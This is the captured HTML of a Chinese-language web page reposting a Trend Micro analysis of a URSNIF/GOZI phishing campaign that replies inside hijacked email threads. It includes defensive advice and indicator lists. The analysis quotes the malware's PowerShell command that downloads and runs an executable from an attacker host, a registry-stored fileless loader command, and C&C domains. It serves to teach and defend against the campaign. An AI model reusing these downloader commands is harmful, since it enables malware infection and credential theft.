+      5aed7d6a3e8692143e53f9556cd3aa371149c96b91c02d1c659cb58d88572e47
+    
+    
+    下载的URSNIF
+   
+    检测为TSPY_URSNIF.THAOOCAH：
+    
+      0a38d92775cfc7182076d9a21c4937149ea8be6ebf22b9530afbca57d69c0d46
+    
+    
+    可执行文件Payload
+   
+    检测为TrojanSpy.Win32.URSNIF.BAIEF：
+    
+      358bd52ac46755b1c6fa73805a7a355450f85f4bcf1b2e798a04960743390422
+    
+    检测为TSPY_URSNIF.THAOOCAH：
+    
+      e8633f2f2b6b0b8f7348b4660e325ab25b87ec8faa40fb49eb0215b31bd276aa
+    
+    检测为TSPY_URSNIF.BAIEB：
+    
+      f92ba10fe245c00575ae8031d4c721fe0ebb0820a4f45f3bbce02654a6e7f18d
+    
+    
+    下载URL
+   
+    
+      hxxp://t95dfesc2mo5jr[.]com/RTT/opanskot[.]php?l=targa2[.]tkn
+      hxxp://enduuyyhgeetyasd[.]com/RTT/opanskot[.]php?l=omg8[.]tkn
+      hxxp://q0fpkblizxfe1l[.]com/RTT/opanskot[.]php?l=targa4[.]tkn
+      hxxp://2dhtsif1a8jhyb[.]com/RTT/opanskot[.]php?l=okb1[.]tkn
+      hxxp://yrtw1djmj6eth7[.]com/RTT/opanskot[.]php?l=okb7[.]tkn
+      hxxp://popoasdzxcqe[.]com/YUY/huonasdh[.]php?l=rgr7[.]tkn
+      hxxp://q0fpkblizxfe1l[.]com/RTT/opanskot[.]php?l=targa2[.]tkn
+      hxxp://e3u1oz4an1dqmj[.]com/RTT/opanskot[.]php?l=okb9[.]tkn
+      hxxp://popoasdzxcqe[.]com/YUY/huonasdh[.]php?l=rgr3[.]tkn
+      hxxp://2dhtsif1a8jhyb[.]com/RTT/opanskot[.]php?l=okb5[.]tkn
+      hxxp://hbhbasdqweb[.]com/YUY/huonasdh[.]php?l=rgr4[.]tkn
+      hxxp://q0fpkblizxfe1l[.]com/RTT/opanskot[.]php?l=targa4[.]tkn
+    
+    
+    C&amp;C 服务器
+   
+    
+      app[.]kartop[.]at
+      doc[.]dicin[.]at
+      doc[.]avitoon[.]at
+      app[.]avitoon[.]at
+      ops[.]twidix[.]at
+      xx[.]go10og[.]at
+      api[.]kartop[.]at
+      m1[.]fofon[.]at
+      cdn[.]kartop[.]at
+      api[.]tylron[.]at
+      chat[.]twidix[.]at
+      api[.]kaonok[.]at
+      chat[.]jimden[.]at
+      mahono[.]cn
+    
+    趋势科技 XGen™安全性提供跨代混合的威胁防御技术，以保护系统免受各种类型的威胁，包括勒索软件和加密货币挖掘恶意软件。在网关和端点上具有高保真的机器学习功能，可以保护物理、虚拟和云工作负载。借助 Web / URL 过滤，行为分析和自定义沙盒等功能，XGen 安全可以抵御当今绕过传统控制的威胁，利用已知、未知或未公开的漏洞，窃取或加密个人身份数据、或进行恶意加密货币挖掘的威胁。◾️
+    
+    
+      
+         共享此文章： 
+        
+          
+                点击以在 Twitter 上共享（在新窗口中打开）  
+                点击以在 Facebook 上共享（在新窗口中打开）  
+            
+          
+        
+      
+    
+    
+       赞过： 
+      
+  赞    正在加载…… 
+      
+   
+   
+    
+    
+       
+     相关
+     
+    
+  
+  
+    
+      Tagged
+       phishing 
+       Security 
+       selfcare 
+       Technology 
+       URSNIF 
+    
+  
+  
+    
+
+    Published
+           2018年10月30日 
+       2019年8月10日 
+    
+  
+
+" />
+    
+    <meta name="author" content="觀點2" />
+
+    
+    <meta property="og:title" content="渔艺正在升级：URSNIF 恶意软件新变种通过回复邮件即可实现传播 - iYouPort" />
+    <meta property="twitter:title" content="渔艺正在升级：URSNIF 恶意软件新变种通过回复邮件即可实现传播 - iYouPort" />
+    
+
+  <link rel="stylesheet" type="text/css" href="/oped2/style.css" />
+  <link rel="alternate" type="application/rss+xml" title="觀點2 - 高頻版 git.io/JUJZT" href="/oped2/feed.xml" />
+
+  <!-- Social Share Kit CSS -->
+  <link rel="stylesheet" href="/oped2/assets/css/social-share-kit.css" type="text/css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.js"></script>
+  <script type="text/javascript" src="/oped2/assets/js/page.js"></script>
+
+</head>
+
+  <body>
+    <div class="wrapper-masthead">
+  <div class="container">
+    <header class="masthead clearfix">
+      
+
+      <div class="site-info">
+        <h1 class="site-name" style="display: inline-block;"><a href="/oped2/">觀點2</a></h1>
+        <i class="site-description" style="font-size: 12px;">高頻版 git.io/JUJZT</i>
+      </div>
+
+      <nav>
+        <span id="search-container" >
+          <a href="/oped2/tools"><i class="fa fa-bookmark twitter" title="百宝箱"></i></a>
+        <a><i class="fa fa-search" title="限前100結果"></i></a><input type="text" id="search-input" placeholder="標題 作者 來源 日期 (5200)"
+          style="margin: 10px 0px 0px 0px; height: 30px;width: auto" title="本站最正確的打開方式">
+        </span>
+        
+        
+        <a href="/oped2/categories" style="color: Tomato;"><i class="fa fa-tags" title="分类"></i></a>
+        
+        
+        
+        <a href="https://be4.herokuapp.com/" style="color: #003366;"><i class="fa fa-comments" title="论坛"></i></a>
+        
+        
+        
+        <a href="/oped2/about"><i class="fa fa-info-circle" title="关于"></i></a>
+        
+        
+        <a title="电脑热键：&larr;上一篇(页), &rarr;下一篇(页), ins同来源新一篇，del同来源旧一篇" onclick="toggle_visibility('help')"><i class="fa fa-question-circle"></i></a>
+        <a id="fa-home" href="https://nodebe4.github.io" title="BE4服务列表" onclick="//toggle_visibility('site-list')"><i class="fa fa-home" aria-hidden="true"></i></a>
+      </nav>
+
+    </header>
+    <div id="site-list" class="tags" style="display: block;text-align: right;border-bottom: 1px solid lightGray;"></div>
+    <p id="help" style="font-size: 14px;display: none;text-align: right;"><span style="color:green;">电脑热键：&larr;上一篇(页), &rarr;下一篇(页), ins同来源新一篇, del同来源旧一篇</span>; <span style="color:orange">对应触屏FAB：上下右左</span>; 轉Markdown<a href="https://euangoddard.github.io/clipboard2markdown/"><i class="fa fa-file-text-o"></i></a></p>
+  </div>
+</div>
+
+<script type="text/javascript" >
+  function toggle_visibility(id){
+    var help = document.getElementById(id)
+    if (help.style.display=='none'){
+      help.style.display='block';
+    }else{
+      help.style.display='none';
+    }
+  }
+
+  const url = "https://nodebe4.github.io/sitelist.json"
+
+  document.addEventListener("DOMContentLoaded", function(event){
+    // var homebtn = document.getElementById("fa-home")
+    // homebtn.removeAttribute("href")
+    var content = document.getElementById("site-list");
+    content.innerHTML = ''
+    var ul = document.createElement("ul")
+    ul.classList.add("label")
+    content.appendChild(ul)
+    var cnt = 0
+
+    $.getJSON(url, function(allsites) {
+
+      allsites.map(item =>{
+        var li = document.createElement('li')
+        li.classList.add("tag")
+        li.id = 'site-' + cnt
+        ul.appendChild(li)
+        var a0 = document.createElement('a')
+        li.appendChild(a0)
+        a0.href = item.url[0]
+        var span = document.createElement('span')
+        a0.appendChild(span)
+        span.innerText = item['name']
+        // span.style.backgroundColor = item['background-color']
+        // span.style.color='#E4CBC3'
+        span.style.color = item['background-color']
+        span.style['font-size'] = '14px'
+        cnt += 1
+        // test_alive(li.id, a0.href)
+      })
+    })
+  })
+
+function test_alive(id, url){
+  var divstatus = document.getElementById(id)
+  const base = 'https://textance.herokuapp.com/title/'
+  var fullurl = base + url
+  $.ajax({
+      url: fullurl,
+      complete: function(data) {
+        if (data.responseText.includes('502')){
+          // divstatus.style.color='#FBB7B7'
+          // divstatus.style.color='gray'
+          // divstatus.title = "服务器无响应"
+          divstatus.parentNode.removeChild(divstatus)
+        }else{
+          // divstatus.style.color='#B6FAC8'
+          divstatus.title = data.responseText
+        }
+      }
+  });
+  return divstatus
+}
+</script>
+
+    <!-- Left & centered positioning -->
+
+<div class="ssk-sticky ssk-right ssk-center ssk-sticky-hide-xs ssk-group ssk-round">
+  
+    <a href="https://be4news.pythonanywhere.com/archivenow/ia/https%3A%2F%2Fwww.iyouport.org%2F%25e6%25b8%2594%25e8%2589%25ba%25e6%25ad%25a3%25e5%259c%25a8%25e5%258d%2587%25e7%25ba%25a7%25ef%25bc%259aursnif-%25e6%2581%25b6%25e6%2584%258f%25e8%25bd%25af%25e4%25bb%25b6%25e6%2596%25b0%25e5%258f%2598%25e7%25a7%258d%25e9%2580%259a%25e8%25bf%2587%25e5%259b%259e%25e5%25a4%258d%25e9%2582%25ae%25e4%25bb%25b6%25e5%258d%25b3%2F" class="ssk ssk-link" title="存到互联网档案馆" target="_blank"></a>
+    <a href="https://www.facebook.com/sharer.php?u=https://www.iyouport.org/%e6%b8%94%e8%89%ba%e6%ad%a3%e5%9c%a8%e5%8d%87%e7%ba%a7%ef%bc%9aursnif-%e6%81%b6%e6%84%8f%e8%bd%af%e4%bb%b6%e6%96%b0%e5%8f%98%e7%a7%8d%e9%80%9a%e8%bf%87%e5%9b%9e%e5%a4%8d%e9%82%ae%e4%bb%b6%e5%8d%b3/" class="ssk ssk-facebook"></a>
+    <a href="https://twitter.com/intent/tweet?url=https://www.iyouport.org/%e6%b8%94%e8%89%ba%e6%ad%a3%e5%9c%a8%e5%8d%87%e7%ba%a7%ef%bc%9aursnif-%e6%81%b6%e6%84%8f%e8%bd%af%e4%bb%b6%e6%96%b0%e5%8f%98%e7%a7%8d%e9%80%9a%e8%bf%87%e5%9b%9e%e5%a4%8d%e9%82%ae%e4%bb%b6%e5%8d%b3/&text=渔艺正在升级：URSNIF 恶意软件新变种通过回复邮件即可实现传播 - iYouPort&hashtags=觀點2" class="ssk ssk-twitter"></a>
+    <a href="https://reddit.com/submit?url=https://www.iyouport.org/%e6%b8%94%e8%89%ba%e6%ad%a3%e5%9c%a8%e5%8d%87%e7%ba%a7%ef%bc%9aursnif-%e6%81%b6%e6%84%8f%e8%bd%af%e4%bb%b6%e6%96%b0%e5%8f%98%e7%a7%8d%e9%80%9a%e8%bf%87%e5%9b%9e%e5%a4%8d%e9%82%ae%e4%bb%b6%e5%8d%b3/&title=渔艺正在升级：URSNIF 恶意软件新变种通过回复邮件即可实现传播 - iYouPort" class="ssk ssk-reddit"></a>
+    <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.iyouport.org/%e6%b8%94%e8%89%ba%e6%ad%a3%e5%9c%a8%e5%8d%87%e7%ba%a7%ef%bc%9aursnif-%e6%81%b6%e6%84%8f%e8%bd%af%e4%bb%b6%e6%96%b0%e5%8f%98%e7%a7%8d%e9%80%9a%e8%bf%87%e5%9b%9e%e5%a4%8d%e9%82%ae%e4%bb%b6%e5%8d%b3/&title=渔艺正在升级：URSNIF 恶意软件新变种通过回复邮件即可实现传播 - iYouPort" class="ssk ssk-linkedin"></a>
+    <a href="mailto:{email_address}?subject=渔艺正在升级：URSNIF 恶意软件新变种通过回复邮件即可实现传播 - iYouPort&body=
+  
+     渔艺正在升级：URSNIF 恶意软件新变种通过回复邮件即可实现传播 
+  
+  
+  McCaffrey     Knowledge Node  ,  技术  ,  技术防身/自我保护方法  ,  给行动者的护身符和武器             2018年10月30日 
+          2019年8月10日 
+   4 Minutes 
+  
+  
+    
+       
+      
+       攻击者正在采取更为复杂的网络钓鱼。由于网络钓鱼攻击依赖于社交工程技术，因此它们往往非常有效。这些技术会创建一些可信的场景或对话，从而诱使用户泄漏信息，或下载恶意软件。在本文的案例中，最棘手的问题在于发件人是真实的用户……
+      
+      
+    
+           
+  
+      
+
+    大多数网络钓鱼活动，其本质非常简单，并且易于发现。攻击者往往会发送一些看似合法的电子邮件，并在其文本中嵌入恶意链接，或在邮件中添加恶意附件。然而，趋势科技在今年9月监测到的恶意邮件活动却表明，攻击者正在采取更为复杂的网络钓鱼形式。
+     
+     该恶意活动会盗取电子邮件账户
+      
+    ，并对邮箱中已有的邮件内容进行回复，在回复的内容中附带恶意软件
+    。对已有邮件的回复，实际上是连续通信中的一部分，因此这种特殊的钓鱼方式难以被用户发现，也难以检测。通常，受害者都没有意识到他们正在遭受钓鱼邮件的威胁。
+    这些攻击与今年早些时候 Talos 发现的  URSNIF/GOZI 恶意邮件  活动非常相似，该恶意活动使用暗云僵尸网络中部分被劫持的计算机向已有邮件发送回信，很可能是 URSNIF/GOZI 恶意邮件活动的升级版本或演变版本。
+    根据迄今为止收集到的数据，趋势科技发现该恶意活动主要影响北美和欧洲地区， 
+    同时在亚洲和拉丁美洲地区也发现了类似的攻击。
+   
+    本次恶意活动的主要目标是教育、金融和能源行业。然而，此次恶意活动还影响到了其他行业，包括房地产、交通运输、制造业和政府。
+    
+    捕获样本
+   
+    趋势科技发现了该恶意活动的一个示例，并对电子邮件的内容进行了截图，如下所示：
+    
+       
+  
+      
+      
+Figure 1. Example of a malicious email that is used to reply to a conversation
+      
+    
+    
+    由于发件人是一位熟悉的人，并且邮件也是往来对话中的一部分，因此作为收件人，很容易会相信这只是对此前邮件内容的另一封回复邮件。此外，该回复的标题和语法似乎都是正确的，甚至在电子邮件的末尾还附带了签名
+    。
+    当然，如果仔细检查，会发现这封电子邮件中存在一些可疑的地方。最明显之处在于，使用的语言从法语变成了英语。此外，恶意电子邮件中的签名与合法电子邮件的签名是不同的。最后还有一点，就是该邮件的内容是通用的，所以可能会偏离原来的交流内容。尽管不能通过这些因素，直接判断出这封邮件是恶意的，但至少能够提起警惕。然而，如果不经仔细阅读，这些小细节可能难以发现，特别是那些每天有大量邮件往来的人。
+    
+       
+  
+      
+      
+Figure 2. Comparison between the malicious email and a legitimate one. Note the difference in language and the changed signature
+      
+    
+    
+    擦亮眼睛！分析电子邮件头部信息
+   
+    在对电子邮件的头部信息进行检查后，发现了该攻击的一些有趣之处。
+    
+       
+  
+      
+      
+Figure 3. The anonymized email header of the malicious message (click the image to zoom in)
+      
+    
+    ⚠️ 在这里， 
+    有3个地方需要注意
+    ：
+    1、通常，恶意邮件都会伪造发件人，会使用 “Return-Path” 或 “Reply-To” 的 SMTP 头部，以便收件人能够将邮件直接回复给恶意攻击者。而在观察到的示例中，没有这两个头部信息，并且所有回复都会发送至发件人（也就是被攻陷的邮箱账户）。这就说明攻击者可能已经通过了发件人邮箱的身份验证。
+    2、“In-Reply-To”头部（或其他类似的 SMTP 头部字段）表示这封邮件是对已有电子邮件通信的回复。
+    3、这封电子邮件的第一跳（The First Hop）来自于 “rrcs-50–74–218–2[.]nyc[.]biz[.]rr[.]com”，这个地址对于家庭用户来说并不常见。对于组织用户来说，除非邮件是来自远程的服务，否则邮件都应该是从组织内部的服务器发送（例如：一个“  sender.co.ca  ”域内的主机）。
+    考虑到这些因素，可以看出这封电子邮件是从美国发出的。而根据示例中发件人邮箱的域名 .ca，这封邮件应该是发自加拿大。
+    经过进一步的调查，发现该域名在2018年9月期间使用了多个电子邮件地址，发送了大量不同的电子邮件。
+    攻击者经常会将附件的文件名与发件人的组织名称相对应，这样就有可能使得邮件看起来更加真实。附件文件名的格式通常是[发件人所在组织]+[与此前通信相关的一个动词，例如“查询”或“请求”].doc，或者就是简单的 [发件人所在组织].doc。这样的附件，使这封邮件不容易被人怀疑。在部分恶意活动中，我们看到附件使用了通用的文件名，例如“查询”、“声明”和“请求”。
+    根据邮件的标题，可以假定，攻击者通过某种方式获得了真实的邮箱账户，并且将该邮箱账户用于类似 BEC 的骗局之中。考虑到其运作方式和使用的技术，怀疑这一新的恶意邮件活动是 URSNIF/GOZI 恶意邮件活动的一部分。发送方的IP地址，可能是僵尸网络中被感染的主机之一。
+    
+    对 Payload 的分析
+   
+    一旦用户双击电子邮件中的恶意.doc附件，就会调用 PowerShell 从 C&amp;C 服务器下载最新版本的 URSNIF（检测为 TSPY_URSNIF.THAOOCAH）恶意软件：
+    
+      
+     powershell $VWc=new-object Net.WebClient;$wIt=’http: //t95dfesc2mo5jr. com/RTT/opanskot.php?l=targa2.tkn’.Split(‘@’);$jzK = ‘369’;$Aiz=$env:public+’\’+$jzK+’.exe’;foreach($fqd in $wIt){try{$VWc.DownloadFile($fqd, $Aiz);Invoke-Item $Aiz;break;}catch{}}
+    
+    
+    该文件是恶意软件的主要加载程序。但是， 
+    在执行其例程之前，它首先会检查操作系统版本，只允许在 Microsoft 操作系统上执行，特别是 Windows Vista 及以上版本。此外，它会避免在某些语言环境中运行，例如 CN（中国）和 RU（俄罗斯）
+    。
+    主加载器负责管理整个执行过程，并将事件记录在文本文件中：
+    
+      %User Temp%\{temp filename}.bin
+    
+    
+       
+  
+      
+      
+Figure 4. Logs of the malware’s loader (click the image to zoom in)
+      
+    
+    它会从 C&amp;C 服务器下载其他模块，并将它们保存在注册表文件夹 HKEY_CURRENT_USER\Software\AppDataLow\Software\Microsoft\3A861D62–51E0–15700F2219A4中。
+    下图展示了创建的注册表项，以及包含脚本和二进制文件的条目。
+    
+       
+  
+      
+      
+Figure 5. The registry key and entries containing scripts and binaries
+      
+    
+    请注意，尽管这些键和部分注册表项的名称在不同计算机上不尽相同，但其位置始终位于 HKCU\Software\AppDataLow\Software\Microsoft\。
+    在下载组件后，会执行存储在 comsxRes（此名称可能会发生变化）中的 PowerShell 脚本。下面的命令行指令展示了如何调用注册表中的十六进制值。
+    
+      exe /C powershell invoke-expression([System.Text.Encoding]::ASCII.GetString((get-itemproperty ‘HKCU:\Software\AppDataLow\Software\Microsoft\3A861D62–51E0–7C9D-AB0E-15700F2219A4’).comsxRes
+    
+    
+       
+  
+      
+      
+Figure 6. Hex values of comsxRes
+      
+    
+    当此脚本加载存储在注册表中的嵌入式二进制文件时，无文件执行就开始了。在下图中，用–{hex-encoded binary} — 替换了二进制数据，从而能展现出全部代码。原始脚本的最底部部分也是使用了 Base64 编码，对其进行了解码，以保证可读性。
+    
+       
+  
+      
+      
+Figure 7. Code of the embedded binary that is stored in the registry
+      
+    
+    恶意程序会在创建的注册表项中搜索 Client32/Client64，并将该代码注入到 explorer.exe 以保证可以持续保留在内存中。注册表中的其他条目在后续例程运行过程中是必不可少的，因为这些条目会被注入的恶意软件代码所引用。例如，“TorClient” 条目指定了恶意软件如何通过 Tor 网络与其 C&amp;C 服务器通信。
+    
+    五、分析信息窃取例程
+   
+    最终的 Payload 是一个名为 Client32 或 Client64 的 DLL 文件，具体取决于主机的体系架构。它也如同大多数恶意软件的组件一样，存储在注册表中。 
+    最终 Payload 的主要目标是进行信息窃取，其中包括以下信息：
+   
+    · 系统信息
+    · 已安装的应用程序列表
+    · 已安装的驱动程序列表
+    · 正在运行的进程列表
+    · 网络设备列表
+    · 外网IP地址
+    · 电子邮件凭据（IMAP、POP3、SMTP）
+    · Cookie
+    · 证书
+    · 屏幕视频捕获（AVI 格式）
+    · 通过网页劫持获得的财务相关信息
+    
+    BSS 段加密
+   
+    在趋势科技所分析的所有 URSNIF 二进制文件中，都包含这个加密部分。在这一部分中，包含着将在代码中使用的所有相关字符串，并且仅会在恶意程序运行时解密。因此无法对字符串进行分析，也无法进行反编译，使得整个分析过程更为复杂。
+    
+    恶意软件的反分析机制
+   
+    为了防止研究人员通过沙箱获取到服务器和配置等信息，URSNIF 会在运行时两次检查光标的位置。如果光标位置不发生变化，那么就说明该恶意软件可能正在沙箱中进行分析，或是正在通过调试器进行分析。反分析的检查将在BSS部分被解密之前完成。如果发现存在问题，那么就会导致该恶意程序进入无限循环，并产生乱码字符串。
+    根据在这次攻击中所看到的情况，似乎攻击者正在不断对他们的网络钓鱼攻击方式进行更新，并探索更能有效迷惑用户的方法。这些网络攻击者不再满足于常规的钓鱼邮件，而是将他们的攻击巧妙的整合到正在进行的对话中，这就使得普通用户难以发现。这样的升级，其实正是攻击者和安全人员之间永无止境的猫捉老鼠游戏中的一部分。
+    
+    防范方法
+   
+    由于网络钓鱼攻击依赖于社会工程技术，因此它们往往非常有效。这些技术会创建一些可信的场景或对话，从而诱使用户泄漏信息，或下载恶意软件。在本文的案例中，最棘手的问题在于发件人是真实的用户。由此提醒大家， 
+    应该尽可能通过双因素身份认证（2FA）来保护自己的网络账户
+    。此外，作为组织，还应该考虑将双因素身份认证集成到系统之中，并且为组织中的成员提供可靠的认证。
+    ⚠️ 此外， 
+    要防范网络钓鱼，还应注意以下几点
+    ：
+    
+      组织中的所有用户都应具备足够的安全意识，了解网络钓鱼攻击的概念、网络钓鱼攻击的常见手段和识别可疑电子邮件的方法。
+      遇到任何可疑的请求时，都应进一步与相关人员进行核实，特别是在进行金融交易之前，务必要谨慎操作。
+      避免打开任何建议修改 Word 中安全配置的文档，这样的文档很有可能是恶意文件。
+      留意邮件中所有可疑之处，包括是否符合对话的上下文、是否使用了你们常用的语言、是否使用的是常用的邮件签名。
+    
+    
+    使用可管理的检测与响应服务（MDR）
+   
+    随着网络钓鱼攻击方式的日益复杂，组织内部的IT团队和安全团队可能难以监控网络和各个终端是否存在被攻击的迹象。尽管提升员工的安全意识有助于防范威胁，但如果要让员工识别精心伪造的电子邮件，还是具有一定的难度。
+    针对没有安全运营中心（SOC）的组织而言，就面临这一个双重挑战，因为一般的 IT 团队往往缺乏进行威胁研究和分析的经验。针对这些组织，建议采用第三方安全厂商的“可管理的检测与响应服务”（  MDR  ），从而帮助抵御高级威胁。Mdr 可以为攻击中的各种环境指标提供一个基线，并且使用这些指标作为安全分析的基础。
+    
+    IoC
+   
+    
+    Word文件的哈希值
+   
+    检测为TROJ_FRS.VSN0BI18 / Trojan.W97M.POWLOAD.SMY：
+    
+      bdd3f03fb074c55cf46d91963313966ce26afdb13b1444258f8f9e7e723d8395
+      dd7b4fc4d5cc1c1e25c800d5622423725a1b29000f93b658a54e267bbbe6f528
+      4df47982fdd1ac336625600fa8c947d45909248309b117d05fc532a2260c7bc4
+    
+    检测为Trojan.W97M.POWLOAD.FGAIBT：
+    
+      f88ef62f2342f4d1105cfe85395b735efd3f0308b79551944983ce245d425510
+      567fe3794a9eec27697ae0634861d284279261880887f60a7374c6cbe63b7674
+    
+    检测为Trojan.W97M.POWLOAD.NSFGAIBF：
+    
+      52d3ece98b6b3b686925156c3d62d8ce133fe3326e11b4c981c251452e4a41d2
+    
+    检测为Trojan.W97M.POWLOAD.SMEMOT：
+    
+      4d0762a6b2879d2fa821716db76bc980fdb3b8507611d2853df58c0d4127f9ea
+    
+    检测为Trojan.W97M.POWLOAD.SMEMOT2：
+    
+      47e2c66ba16e3ffa9704a13f2c00670319bf292b3d2aa7deede5442da02181e5
+      c2c946f7fd63fc15048a9af4043686f5a56b169e74cb36892fb8d1563b810467
+    
+    检测为Trojan.W97M.POWLOAD.SMTHF3：
+    
+      21ce42a1fc6631ed10db3d0e44b4ccb6d96a729fc494bd86a57cf07ff72cb8f2
+    
+    检测为Trojan.W97M.POWLOAD.SMY：
+    
+      de8f8f39259992886da3b07635cbf121027379e5c1a156a32c6c6e5ace3cc4c3
+      6b387b8534da9cc7cf0af4f2fb8c2a92f9316c0ea6ffb9cfe49b09b4c3df9778
+      6bf99f4b17a07e788219333d96a7a19c9eddc1b49d16c2a21da255a6a16c80d5
+      33d078881456e3b930c480803902fa28142b17c8550f3932e7cf4a1df0eb9213
+      6ca2d4dcea456b9d4c87f211ed20bb32f71a0c78ee8059b934162e643d66e0c9
+      82bee0c249b63f349d212a36f0b9ad90f909017ac734eac133353a1135d7474d
+      1f2e12a58cc23f4e6e7f17b8c1a5c50b88614fda103577354b9564f2dffc257f
+    
+    检测为W2KM_POWLOAD.FGAIBT：
+    
+      1db71aec64d0e391a8c99f4f6ee214962a281733643ace0874cf69e2843f448c
+    
+    检测为W2KM_POWLOAD.NSFGAIBF：
+    
+      c33d642da477f65c11daa9e8098b9917c4c5a6f131dd1369a20cb1b14c4cc261
+      398e677290b1db00d8751c3498847ad9c7d10721630175d2506c4d45af19d229
+      813a08d3b2216c89d42e8225c6de760d785905d1c76bd7428201d68c3c368f65
+    
+    检测为W2KM_POWLOAD.THIACAH：
+    
+      5aed7d6a3e8692143e53f9556cd3aa371149c96b91c02d1c659cb58d88572e47
+    
+    
+    下载的URSNIF
+   
+    检测为TSPY_URSNIF.THAOOCAH：
+    
+      0a38d92775cfc7182076d9a21c4937149ea8be6ebf22b9530afbca57d69c0d46
+    
+    
+    可执行文件Payload
+   
+    检测为TrojanSpy.Win32.URSNIF.BAIEF：
+    
+      358bd52ac46755b1c6fa73805a7a355450f85f4bcf1b2e798a04960743390422
+    
+    检测为TSPY_URSNIF.THAOOCAH：
+    
+      e8633f2f2b6b0b8f7348b4660e325ab25b87ec8faa40fb49eb0215b31bd276aa
+    
+    检测为TSPY_URSNIF.BAIEB：
+    
+      f92ba10fe245c00575ae8031d4c721fe0ebb0820a4f45f3bbce02654a6e7f18d
+    
+    
+    下载URL
+   
+    
+      hxxp://t95dfesc2mo5jr[.]com/RTT/opanskot[.]php?l=targa2[.]tkn
+      hxxp://enduuyyhgeetyasd[.]com/RTT/opanskot[.]php?l=omg8[.]tkn
+      hxxp://q0fpkblizxfe1l[.]com/RTT/opanskot[.]php?l=targa4[.]tkn
+      hxxp://2dhtsif1a8jhyb[.]com/RTT/opanskot[.]php?l=okb1[.]tkn
+      hxxp://yrtw1djmj6eth7[.]com/RTT/opanskot[.]php?l=okb7[.]tkn
+      hxxp://popoasdzxcqe[.]com/YUY/huonasdh[.]php?l=rgr7[.]tkn
+      hxxp://q0fpkblizxfe1l[.]com/RTT/opanskot[.]php?l=targa2[.]tkn
+      hxxp://e3u1oz4an1dqmj[.]com/RTT/opanskot[.]php?l=okb9[.]tkn
+      hxxp://popoasdzxcqe[.]com/YUY/huonasdh[.]php?l=rgr3[.]tkn
+      hxxp://2dhtsif1a8jhyb[.]com/RTT/opanskot[.]php?l=okb5[.]tkn
+      hxxp://hbhbasdqweb[.]com/YUY/huonasdh[.]php?l=rgr4[.]tkn
+      hxxp://q0fpkblizxfe1l[.]com/RTT/opanskot[.]php?l=targa4[.]tkn
+    
+    
+    C&amp;C 服务器
+   
+    
+      app[.]kartop[.]at
+      doc[.]dicin[.]at
+      doc[.]avitoon[.]at
+      app[.]avitoon[.]at
+      ops[.]twidix[.]at
+      xx[.]go10og[.]at
+      api[.]kartop[.]at
+      m1[.]fofon[.]at
+      cdn[.]kartop[.]at
+      api[.]tylron[.]at
+      chat[.]twidix[.]at
+      api[.]kaonok[.]at
+      chat[.]jimden[.]at
+      mahono[.]cn
+    
+    趋势科技 XGen™安全性提供跨代混合的威胁防御技术，以保护系统免受各种类型的威胁，包括勒索软件和加密货币挖掘恶意软件。在网关和端点上具有高保真的机器学习功能，可以保护物理、虚拟和云工作负载。借助 Web / URL 过滤，行为分析和自定义沙盒等功能，XGen 安全可以抵御当今绕过传统控制的威胁，利用已知、未知或未公开的漏洞，窃取或加密个人身份数据、或进行恶意加密货币挖掘的威胁。◾️
+    
+    
+      
+         共享此文章： 
+        
+          
+                点击以在 Twitter 上共享（在新窗口中打开）  
+                点击以在 Facebook 上共享（在新窗口中打开）  
+            
+          
+        
+      
+    
+    
+       赞过： 
+      
+  赞    正在加载…… 
+      
+   
+   
+    
+    
+       
+     相关
+     
+    
+  
+  
+    
+      Tagged
+       phishing 
+       Security 
+       selfcare 
+       Technology 
+       URSNIF 
+    
+  
+  
+    
+
+    Published
+           2018年10月30日 
+       2019年8月10日 
+    
+  
+
+" class="ssk ssk-email"></a>
+    <a href="http://pinterest.com/pin/create/link/?url=https://www.iyouport.org/%e6%b8%94%e8%89%ba%e6%ad%a3%e5%9c%a8%e5%8d%87%e7%ba%a7%ef%bc%9aursnif-%e6%81%b6%e6%84%8f%e8%bd%af%e4%bb%b6%e6%96%b0%e5%8f%98%e7%a7%8d%e9%80%9a%e8%bf%87%e5%9b%9e%e5%a4%8d%e9%82%ae%e4%bb%b6%e5%8d%b3/" class="ssk ssk-pinterest"></a>
+    <a href="https://www.tumblr.com/widgets/share/tool?canonicalUrl=https://www.iyouport.org/%e6%b8%94%e8%89%ba%e6%ad%a3%e5%9c%a8%e5%8d%87%e7%ba%a7%ef%bc%9aursnif-%e6%81%b6%e6%84%8f%e8%bd%af%e4%bb%b6%e6%96%b0%e5%8f%98%e7%a7%8d%e9%80%9a%e8%bf%87%e5%9b%9e%e5%a4%8d%e9%82%ae%e4%bb%b6%e5%8d%b3/&title=渔艺正在升级：URSNIF 恶意软件新变种通过回复邮件即可实现传播 - iYouPort&caption=
+  
+     渔艺正在升级：URSNIF 恶意软件新变种通过回复邮件即可实现传播 
+  
+  
+  McCaffrey     Knowledge Node  ,  技术  ,  技术防身/自我保护方法  ,  给行动者的护身符和武器             2018年10月30日 
+          2019年8月10日 
+   4 Minutes 
+  
+  
+    
+       
+      
+       攻击者正在采取更为复杂的网络钓鱼。由于网络钓鱼攻击依赖于社交工程技术，因此它们往往非常有效。这些技术会创建一些可信的场景或对话，从而诱使用户泄漏信息，或下载恶意软件。在本文的案例中，最棘手的问题在于发件人是真实的用户……
+      
+      
+    
+           
+  
+      
+
+    大多数网络钓鱼活动，其本质非常简单，并且易于发现。攻击者往往会发送一些看似合法的电子邮件，并在其文本中嵌入恶意链接，或在邮件中添加恶意附件。然而，趋势科技在今年9月监测到的恶意邮件活动却表明，攻击者正在采取更为复杂的网络钓鱼形式。
+     
+     该恶意活动会盗取电子邮件账户
+      
+    ，并对邮箱中已有的邮件内容进行回复，在回复的内容中附带恶意软件
+    。对已有邮件的回复，实际上是连续通信中的一部分，因此这种特殊的钓鱼方式难以被用户发现，也难以检测。通常，受害者都没有意识到他们正在遭受钓鱼邮件的威胁。
+    这些攻击与今年早些时候 Talos 发现的  URSNIF/GOZI 恶意邮件  活动非常相似，该恶意活动使用暗云僵尸网络中部分被劫持的计算机向已有邮件发送回信，很可能是 URSNIF/GOZI 恶意邮件活动的升级版本或演变版本。
+    根据迄今为止收集到的数据，趋势科技发现该恶意活动主要影响北美和欧洲地区， 
